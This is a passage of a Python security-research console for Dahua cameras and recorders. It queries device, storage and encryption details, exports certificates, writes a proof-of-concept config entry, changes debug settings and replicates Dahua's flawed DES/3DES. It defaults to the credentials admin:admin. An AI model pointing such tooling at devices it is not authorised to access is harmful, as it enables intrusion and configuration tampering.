					log.success("\033[92m[\033[91mSystem\033[92m]\033[0m\nVendor: {}, Build: {}, Version: {}\nWeb: {}, OEM: {}, Package: {}".format(
						data.get('Vendor',"(null)"),
						data.get('BuildDateTime',"(null)"),
						VERSION,
						data.get('WebVersion',"(null)"),
						data.get('OEMVersion',"(null)"),
						data.get('PackageBaseName',"(null)"),
						))

			query_args = {
				"method":"magicBox.getSystemInfo",
				"session":self.SessionID,
				"params": None,
				"id":self.ID
				}

			data = self.P2P(json.dumps(query_args))
			if not data == None:
				data = json.loads(data)

				if data.get('result'):
					data = data.get('params')
					log.success("\033[92m[\033[91mDevice\033[92m]\033[0m\nType: {}, CPU: {}, HW ver: {}, S/N: {}".format(
						data.get('deviceType',"(null)"),
						data.get('processor',"(null)"),
						data.get('hardwareVersion',"(null)"),
						data.get('serialNumber',"(null)"),
						))

			query_args = {
				"method":"magicBox.getMemoryInfo",
				"session":self.SessionID,
				"params": None,
				"id":self.ID
				}

			data = self.P2P(json.dumps(query_args))
			if not data == None:
				data = json.loads(data)

				if data.get('result'):
					data = data.get('params')
					log.success("\033[92m[\033[91mMemory\033[92m]\033[0m\nTotal: {} MB, Free: {} MB".format(
						int(data.get('total',0)) / float(float(1024) ** 2),
						int(data.get('free',0)) / float(float(1024) ** 2)
						))

			query_args = {
				"method":"storage.getDeviceAllInfo",
				"session":self.SessionID,
				"params": None,
				"id":self.ID
				}

			data = self.P2P(json.dumps(query_args))
			if not data == None:
				data = json.loads(data)

				if data.get('result'):
					NAME = data.get('params').get('info')[0].get('Name',"(null)")
					data = data.get('params').get('info')[0].get('Detail')[0]
					log.success("\033[92m[\033[91mStorage\033[92m]\033[0m\nDevice: {}, Mount: {}, Access: {}\nTotal: {} MB, Used: {} MB, Free: {} MB".format(
						NAME,
						data.get('Path',"(null)"),
						data.get('Type',"(null)"),
						int(data.get('TotalBytes',0)) / float(float(1024) ** 2),
						int(data.get('UsedBytes',0)) / float(float(1024) ** 2),
						(int(data.get('TotalBytes',0)) / float(float(1024) ** 2)) - (int(data.get('UsedBytes',0)) / float(float(1024) ** 2)),
						))


			query_args = {
				"method":"Security.getEncryptInfo",
				"session":self.SessionID,
				"params": None,
				"id":self.ID
				}

			data = self.P2P(json.dumps(query_args))
			if not data == None:
				data = json.loads(data)

				if data.get('result'):
					pub = data.get('params').get('pub').split(",")
					log.success("\033[92m[\033[91mEncrypt Info\033[92m]\033[0m\nAsymmetric: {}, Cipher(s): {}, RSA Passphrase: {}\nRSA Modulus: {}".format(
						data.get('params').get('asymmetric'),
						'; '.join(data.get('params').get('cipher')),
						pub[1].split(":")[1],
						pub[0].split(":")[1],
						))
					pubkey = RSA.construct(( int(pub[0].split(":")[1],16),int(pub[1].split(":")[1],16) ))
					print(pubkey.exportKey().decode('ascii'))

		elif cmd[0] == 'certificate':
			query_args = {
				"method":"CertManager.exportRootCert",
				"session":self.SessionID,
				"params": None,
				"id":self.ID
				}

			data = self.P2P(json.dumps(query_args))
			if not data == None:
				data = json.loads(data)

				if data.get('result'):
					CACERT = base64.decodebytes(data.get('params').get('cert').encode('latin-1'))
					x509 = crypto.load_certificate(crypto.FILETYPE_PEM, CACERT)
					issuer = x509.get_issuer()
					subject = x509.get_subject()

					log.success("\033[92m[\033[91mRoot Certificate\033[92m]\033[0m\n\033[92m[\033[91mIssuer\033[92m]\033[0m\n{}\n\033[92m[\033[91mSubject\033[92m]\033[0m\n{}\n{}".format(
						str(x509.get_issuer()).split("'")[1],
						str(x509.get_subject()).split("'")[1],
						CACERT.decode('latin-1'),
						))

					log.success("\033[92m[\033[91mPublic Key\033[92m]\033[0m\n{}".format(
						crypto.dump_publickey(crypto.FILETYPE_PEM,x509.get_pubkey()).decode('latin-1'),
						))

			query_args = {
				"method":"CertManager.getSvrCertInfo",
				"session":self.SessionID,
				"params": None,
				"id":self.ID
				}

			data = self.P2P(json.dumps(query_args))
			if not data == None:
				data = json.loads(data)
				data.pop('id')
				data.pop('session')
				if data.get('result'):
					log.success("\033[92m[\033[91mServer Certificate\033[92m]\033[0m\n{}".format(
						json.dumps(data,indent=4),
						))

	def newConfig(self,msg):
		msg = msg
		cmd = msg.split()

		if len(cmd) == 1:
			log.failure("Usage: show / set / get / del")
			return 

		if cmd[1] == 'set' or cmd[1] == 'show':
			query_args = {
				"method":"configManager.setConfig",
					"params": {
					"table": {
						"Config":31337,
						"Enable":False,
						"Description":"Just simple PoC",
						},
					"name":"Config_31337",
					},
				"session":self.SessionID,
				"id":self.ID
				}
			if cmd[1] == 'show':
				print(json.dumps(query_args,indent=4))
				return


			log.info("query: {} ".format(query_args))

			data = self.P2P(json.dumps(query_args))
			if data == None:
				return
			data = json.loads(data)
			print(json.dumps(data,indent=4))

		elif cmd[1] == 'get':
			query_args = {
				"method":"configManager.getConfig",
				"params": {
					"name":"Config_31337",
					},
				"session":self.SessionID,
				"id":self.ID
				}

			log.info("query: {} ".format(query_args))

			data = self.P2P(json.dumps(query_args))
			if data == None:
				return

			data = json.loads(data)
			print(json.dumps(data,indent=4))

		elif cmd[1] == 'del':
			query_args = {
				"method":"configManager.deleteConfig",
				"params": {
					"name":"Config_31337",
					},
				"session":self.SessionID,
				"id":self.ID
				}

			log.info("query: {} ".format(query_args))

			data = self.P2P(json.dumps(query_args))
			if data == None:
				return

			data = json.loads(data)
			print(json.dumps(data,indent=4))

		else:
			log.failure("Usage: show / set / get / del")
			return 

	def setDebug(self,msg):

		query_args = {
			"method":"configManager.setConfig",
				"params": {
				"name":"Debug",
					"table": {
						"PrintLogLevel":0,
						},
				},
			"session":self.SessionID,
			"id":self.ID
			}

		data = self.P2P(json.dumps(query_args))
		if data == None:
			return
		data = json.loads(data)
		log.success("PrintLogLevel 0: {}".format(data.get('result')))

		query_args = {
			"method":"configManager.setConfig",
				"params": {
				"name":"Debug",
					"table": {
						"PrintLogLevel":6,
						},
				},
			"session":self.SessionID,
			"id":self.ID
			}

		data = self.P2P(json.dumps(query_args))
		if data == None:
			return
		data = json.loads(data)
		log.success("PrintLogLevel 6: {}".format(data.get('result')))
		return

#
# Validate HOST, IP and PORT
#
class Validate:

	def __init__(self, check):
		self.check = check

	# Check if IP is valid
	def CheckIP(self):

		ip = self.check.split('.')
		if len(ip) != 4:
			return False
		for tmp in ip:
			if not tmp.isdigit():
				return False
			i = int(tmp)
			if i < 0 or i > 255:
				return False
		return True

	# Check if PORT is valid
	def Port(self):

		if int(self.check) < 1 or int(self.check) > 65535:
			return False
		else:
			return True

	# Check if HOST is valid
	def Host(self):

		try:
			# Check valid IP
			socket.inet_aton(self.check) # Will generate exeption if we try with DNS or invalid IP
			# Now we check if it is correct typed IP
			if self.CheckIP():
				return self.check
			else:
				return False
		except socket.error as e:
			# Else check valid DNS name, and use the IP address
			try:
				return(socket.gethostbyname(self.check))
			except socket.error as e:
				return False


#
# This code is based based on
#
# """
# A pure python implementation of the DES and TRIPLE DES encryption algorithms.
# Author:   Todd Whiteman
# Homepage: http://twhiteman.netfirms.com/des.html
# """
#
# [WARNING!] Do NOT reuse below code for legit DES/3DES! [WARNING!]
#
# This code has been cleaned and modified so it will fit my needs to
# replicate Dahua's implemenation of DES/3DES with endianness bugs.
#

# The base class shared by des and triple des.
class _baseDes(object):
	def __init__(self):
		self.block_size = 8

	def getKey(self):
		"""getKey() -> bytes"""
		return self.__key

	def setKey(self, key):
		"""Will set the crypting key for this object."""
		self.__key = key


#############################################################################
#         DES         #
#############################################################################
class des(_baseDes):

	# Permutation and translation tables for DES
	__pc1 = [
		56, 48, 40, 32, 24, 16,  8,
		0, 57, 49, 41, 33, 25, 17,
		9,  1, 58, 50, 42, 34, 26,
		18, 10,  2, 59, 51, 43, 35,
		62, 54, 46, 38, 30, 22, 14,
		6, 61, 53, 45, 37, 29, 21,
		13,  5, 60, 52, 44, 36, 28,
		20, 12,  4, 27, 19, 11,  3
	]

	# number left rotations of pc1
	__left_rotations = [
		1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1
	]

	# permuted choice key (table 2)
	__pc2 = [
		13, 16, 10, 23,  0,  4,
		2, 27, 14,  5, 20,  9,
		22, 18, 11,  3, 25,  7,
		15,  6, 26, 19, 12,  1,
		40, 51, 30, 36, 46, 54,
		29, 39, 50, 44, 32, 47,
		43, 48, 38, 55, 33, 52,
		45, 41, 49, 35, 28, 31
	]

	# initial permutation IP
	__ip = [
		57, 49, 41, 33, 25, 17, 9,  1,
		59, 51, 43, 35, 27, 19, 11, 3,
		61, 53, 45, 37, 29, 21, 13, 5,
		63, 55, 47, 39, 31, 23, 15, 7,
		56, 48, 40, 32, 24, 16, 8,  0,
		58, 50, 42, 34, 26, 18, 10, 2,
		60, 52, 44, 36, 28, 20, 12, 4,
		62, 54, 46, 38, 30, 22, 14, 6
	]

	# Expansion table for turning 32 bit blocks into 48 bits
	__expansion_table = [
		31,  0,  1,  2,  3,  4,
		3,  4,  5,  6,  7,  8,
		7,  8,  9, 10, 11, 12,
		11, 12, 13, 14, 15, 16,
		15, 16, 17, 18, 19, 20,
		19, 20, 21, 22, 23, 24,
		23, 24, 25, 26, 27, 28,
		27, 28, 29, 30, 31,  0
	]

	# The (in)famous S-boxes
	__sbox = [
		# S1
		[14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7,
		0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8,
		4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0,
		15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13],

		# S2
		[15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10,
		3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5,
		0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15,
		13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9],

		# S3
		[10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8,
		13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1,
		13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7,
		1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12],

		# S4
		[7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15,
		13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9,
		10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4,
		3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14],

		# S5
		[2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9,
		14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6,
		4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14,
		11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3],

		# S6
		[12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11,
		10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8,
		9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6,
		4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13],

		# S7
		[4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1,
		13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6,
		1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2,
		6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12],

		# S8
		[13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7,
		1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2,
		7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8,
		2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11],
	]


	# 32-bit permutation function P used on the output of the S-boxes
	__p = [
		15, 6, 19, 20, 28, 11,
		27, 16, 0, 14, 22, 25,
		4, 17, 30, 9, 1, 7,
		23,13, 31, 26, 2, 8,
		18, 12, 29, 5, 21, 10,
		3, 24
	]

	# final permutation IP^-1
	__fp = [
		39,  7, 47, 15, 55, 23, 63, 31,
		38,  6, 46, 14, 54, 22, 62, 30,
		37,  5, 45, 13, 53, 21, 61, 29,
		36,  4, 44, 12, 52, 20, 60, 28,
		35,  3, 43, 11, 51, 19, 59, 27,
		34,  2, 42, 10, 50, 18, 58, 26,
		33,  1, 41,  9, 49, 17, 57, 25,
		32,  0, 40,  8, 48, 16, 56, 24
	]

	# Initialisation
	def __init__(self, key):
		_baseDes.__init__(self)
		self.key_size = 8
		self.L = []
		self.R = []
		self.Kn = [ [0] * 48 ] * 16 # 16 48-bit keys (K1 - K16)
		self.final = []

		self.setKey(key)

	def setKey(self, key):
		"""Will set the crypting key for this object. Must be 8 bytes."""
		_baseDes.setKey(self, key)
		self.__create_sub_keys()

	def __String_to_BitList(self, data):
		"""Turn the string data, into a list of bits (1, 0)'s"""
		return bits(data,endian='little') # Dahua endianness bug

	def __BitList_to_String(self, data):
		"""Turn the list of bits -> data, into a string"""
		return bytes(list(unbits(data,endian='little'))) # Dahua endianness bug

	def __permutate(self, table, block):
		"""Permutate this block with the specified table"""
		return list(map(lambda x: block[x], table))
	
	# Transform the secret key, so that it is ready for data processing
	# Create the 16 subkeys, K[1] - K[16]
	def __create_sub_keys(self):
		"""Create the 16 subkeys K[1] to K[16] from the given key"""
		key = self.__permutate(des.__pc1, self.__String_to_BitList(self.getKey()))
		i = 0
		# Split into Left and Right sections
		self.L = key[:28]
		self.R = key[28:]

		while i < 16:
			j = 0
			# Perform circular left shifts
			while j < des.__left_rotations[i]:
				self.L.append(self.L[0])
				del self.L[0]

				self.R.append(self.R[0])
				del self.R[0]
				j += 1
			# Create one of the 16 subkeys through pc2 permutation
			self.Kn[i] = self.__permutate(des.__pc2, self.L + self.R)
			i += 1

	# Main part of the encryption algorithm, the number cruncher :)
	def __des_crypt(self, block, crypt_type):
		"""Crypt the block of data through DES bit-manipulation"""
		block = self.__permutate(des.__ip, block)

		self.L = block[:32]
		self.R = block[32:]

		# Encryption starts from Kn[1] through to Kn[16]
		if crypt_type == ENCRYPT:
			iteration = 0
			iteration_adjustment = 1
		# Decryption starts from Kn[16] down to Kn[1]
		else:
			iteration = 15
			iteration_adjustment = -1

		i = 0
		while i < 16:
			# Make a copy of R[i-1], this will later become L[i]
			if crypt_type == ENCRYPT:
				tempR = self.R[:]
			else:
				tempR = self.L[:]

			# Permutate R[i - 1] to start creating R[i]
			if crypt_type == ENCRYPT:
				self.R = self.__permutate(des.__expansion_table, self.R)
			else:
				self.L = self.__permutate(des.__expansion_table, self.L)

			# Exclusive or R[i - 1] with K[i], create B[1] to B[8] whilst here
			if crypt_type == ENCRYPT:
				self.R = list(map(lambda x, y: x ^ y, self.R, self.Kn[iteration]))
				B = [self.R[:6], self.R[6:12], self.R[12:18], self.R[18:24], self.R[24:30], self.R[30:36], self.R[36:42], self.R[42:]]
			else:
				self.L = list(map(lambda x, y: x ^ y, self.L, self.Kn[iteration]))
				B = [self.L[:6], self.L[6:12], self.L[12:18], self.L[18:24], self.L[24:30], self.L[30:36], self.L[36:42], self.L[42:]]

			# Permutate B[1] to B[8] using the S-Boxes
			j = 0
			Bn = []
			while j < 8:

				# Work out the offsets
				m = (B[j][0] << 1) + B[j][5]
				n = (B[j][1] << 3) + (B[j][2] << 2) + (B[j][3] << 1) + B[j][4]

				# Find the permutation value
				v = des.__sbox[j][(m << 4) + n]

				# Turn value into bits, add it to result: Bn
				for tmp in list(map(lambda x: x, bits(v,endian='little')[:4])): # Dahua endianness bug
					Bn.append(tmp)

				j += 1

			# Permutate the concatination of B[1] to B[8] (Bn)
			if crypt_type == ENCRYPT:
				self.R = self.__permutate(des.__p, Bn)
			else:
				self.L = self.__permutate(des.__p, Bn)

			# Xor with L[i - 1]
			if crypt_type == ENCRYPT:
				self.R = list(map(lambda x, y: x ^ y, self.R, self.L))
			else:
				self.L = list(map(lambda x, y: x ^ y, self.R, self.L))

			# L[i] becomes R[i - 1]
			if crypt_type == ENCRYPT:
				self.L = tempR
			else:
				self.R = tempR

			i += 1
			iteration += iteration_adjustment

		# Final permutation of R[16]L[16]
		if crypt_type == ENCRYPT:
			self.final = self.__permutate(des.__fp, self.L + self.R)
		else:
			self.final = self.__permutate(des.__fp, self.L + self.R)
		return self.final


	# Data to be encrypted/decrypted
	def crypt(self, data, crypt_type):
		"""Crypt the data in blocks, running it through des_crypt()"""

		# Error check the data
		if not data:
			return ''

		# Split the data into blocks, crypting each one seperately
		i = 0
		dict = {}
		result = []

		while i < len(data):

			block = self.__String_to_BitList(data[i:i+8])
			processed_block = self.__des_crypt(block, crypt_type)

			# Add the resulting crypted block to our list
			result.append(self.__BitList_to_String(processed_block))
			i += 8

		# Return the full crypted string
		return bytes.fromhex('').join(result)

	def encrypt(self, data):

		return self.crypt(data, ENCRYPT)

	def decrypt(self, data):

		return self.crypt(data, DECRYPT)



#############################################################################
#     Triple DES        #
#############################################################################
class triple_des(_baseDes):

	def __init__(self, key):
		_baseDes.__init__(self)

		self.setKey(key)

	def setKey(self, key):
		"""Will set the crypting key for this object. Either 16 or 24 bytes long."""
		self.key_size = 24  # Use DES-EDE3 mode
		if len(key) != self.key_size:
			if len(key) == 16: # Use DES-EDE2 mode
				self.key_size = 16

		self.__key1 = des(key[:8])
		self.__key2 = des(key[8:16])
		if self.key_size == 16:
			self.__key3 = self.__key1
		else:
			self.__key3 = des(key[16:])

		_baseDes.setKey(self, key)

	def encrypt(self, data):

		data = self.__key1.crypt(data, ENCRYPT)
		data = self.__key2.crypt(data, DECRYPT)
		data = self.__key3.crypt(data, ENCRYPT)
		return data

	def decrypt(self, data):
		data = self.__key3.crypt(data, DECRYPT)
		data = self.__key2.crypt(data, ENCRYPT)
		data = self.__key1.crypt(data, DECRYPT)
		return data
#
# --------- [END] ---------
#


if __name__ == '__main__':

#
# Help, info and pre-defined values
#	
	INFO =  '[Dahua JSON Debug Console 2019,2020 bashis <mcw noemail eu>]\n'
	RHOST = '192.168.57.20'			# Default Remote HOST
	RPORT = 5000					# Default Remote PORT (Normally DHIP used port)
#	RPORT = 80						# Default Remote PORT (PoC that normal HTTP port working too with DHIP)
	CREDS = 'admin:admin'			# Default
#	CREDS = 'anonymity:anonymity'	# Anonymous Login must be enabled for this account
	PROTO = 'dhip' 					# Protocol: dhip, dvrip

#
# Try to parse all arguments
# 
	try:
		arg_parser = argparse.ArgumentParser(
		prog=sys.argv[0],
				description=('[*] '+ INFO +' [*]'))
		arg_parser.add_argument('--rhost', required=False, default=RHOST, help='Remote Target Address (IP/FQDN) [Default: '+ RHOST +']')
		arg_parser.add_argument('--rport', required=False, type=int, help='Remote Target HTTP/HTTPS Port [Default: '+ str(RPORT) +']')
		arg_parser.add_argument('--proto', required=False, type=str, choices=['dhip', 'dvrip', '3des'],default=PROTO, help='Protocol [Default: '+ PROTO +']')
		if CREDS:
			arg_parser.add_argument('--auth', required=False, type=str, default=CREDS, help='Basic Authentication [Default: '+ CREDS + ']')
		arg_parser.add_argument('--ssl', required=False, default=False, action='store_true', help='Use SSL for remote connection [Default: False]')
		arg_parser.add_argument('-d','--debug', required=False, default=0, const=0x1, dest="debug", action='store_const', help='Debug (normal)')
		arg_parser.add_argument('-dd','--ddebug', required=False, default=0, const=0x2, dest="ddebug", action='store_const', help='Debug (hexdump)')
		arg_parser.add_argument('--dump', required=False, default=False, type=str, choices=['config', 'service','device'], help='Dump remote config')
		arg_parser.add_argument('--discover', required=False, type=str, choices=['dhip'], help='discover [Default: False]')
		arg_parser.add_argument('-f','--force', required=False, default=False, action='store_true', help='Force [Default: False]')
		args = arg_parser.parse_args()
	except Exception as e:
		print(INFO,"\nError: {}\n".format(str(e)))
		sys.exit(False)

	# We want at least one argument, so print out help
	if len(sys.argv) == 1:
		arg_parser.parse_args(['-h'])

	log.info(INFO)
	status = True

	debug = args.debug + args.ddebug

	if (args.proto == 'dvrip' or args.proto == '3des') and not args.rport:
		args.rport = 37777

	if args.ssl:
		if not args.force:
			log.failure("SSL do not fully work")
			log.failure("If you still want to try, run this script with --force")
			status = False
		args.ssl = True
		if not args.rport:
			args.rport = '443'

	if not args.rport:
		args.rport = RPORT
	# Check if RPORT is valid
	if not Validate(args.rport).Port():
		log.failure("Invalid RPORT - Choose between 1 and 65535")
		status = False

	# Check if RHOST is valid IP or FQDN, get IP back
	args.rhost = Validate(args.rhost).Host()
	if not args.rhost:
		log.failure("Invalid RHOST")
		status = False

#
# Validation done, start print out stuff to the user
#
	if status:
		if args.ssl:
			log.info("SSL Mode Selected")
		if args.discover:
			if args.rhost == RHOST:
				if args.discover == 'dhip':
					args.rhost = '239.255.255.251' # MCAST
			status = DHDiscover(args.rhost,args.discover)
		else:
			Dahua = Dahua_Functions(args.rhost, args.rport, args.ssl, args.auth, args.proto, args.force)
			status = Dahua.DebugConsole()

	log.info("All done")
	sys.exit(status)

